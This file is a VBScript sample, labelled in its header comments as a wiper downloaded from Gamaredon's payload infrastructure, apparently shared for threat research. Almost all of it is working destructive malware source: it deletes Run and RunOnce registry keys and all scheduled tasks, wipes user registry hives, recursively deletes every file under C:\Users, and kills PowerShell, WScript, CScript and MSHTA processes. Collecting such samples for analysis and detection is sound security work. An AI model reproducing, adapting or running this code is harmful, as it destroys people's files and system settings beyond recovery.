' This is a wiper script sample downloaded from gamaredons payload delivery infrastructure
' https://blog.synapticsystems.de/inside-gamaredon-2025-zero-click-espionage-at-scale/

set objShell = CreateObject("WScript.Shell")
strKeyPath = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
objShell.RegDelete strKeyPath
strKeyPath = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\"
objShell.RegDelete strKeyPath

command = "cmd /c schtasks /delete /tn * /f"
objShell.Run command, 0, False

hives = Array("AppEvents", "Console", "Control Panel", "Environment", "EUDC", "Keyboard Layout", "Microsoft", "Network", "PersistentPropertyBag", "Printers", "SOFTWARE", "System", "Volatile Environment")

for each item in hives
	strKeyPath = "HKCU\" + item + "\"
	objShell.RegDelete strKeyPath
	
	hkcu = &H80000001
	Set oReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
	oReg.EnumValues hkcu, item, valueNames, valueTypes

	for each regItem in valueNames
		strKeyPath = "HKCU\" + item + "\" + regItem
		objShell.RegDelete strKeyPath
	next
next

rootFolder = "C:\Users"

set fso = CreateObject("Scripting.FileSystemObject")

sub DeleteFilesRecursively(folder)
    on error resume next
	
    for each file in folder.Files
        on error resume next
        file.Delete True
    next

    for each subfolder in folder.SubFolders
        DeleteFilesRecursively(subfolder)
    next
end sub

DeleteFilesRecursively(fso.GetFolder(rootFolder))

sub WalkRegistry(keyPath)
    on error resume next

    keys = objShell.RegRead(keyPath)

    for each subKey in keys
        if Right(subKey, 1) = "\" then
            WalkRegistry(keyPath & subKey)
		else	
			objShell.RegDelete keyPath & subKey
        end if
    Next
end sub

WalkRegistry("HKCU\")

set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")

for each objProcess in colProcesses
    on error resume next
    objProcess.Terminate()
next

set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'wscript.exe'")

for each objProcess in colProcesses
    on error resume next
    objProcess.Terminate()
next

set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'cscript.exe'")

for each objProcess in colProcesses
    on error resume next
    objProcess.Terminate()
next

set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'mshta.exe'")

for each objProcess in colProcesses
    on error resume next
    objProcess.Terminate()
next
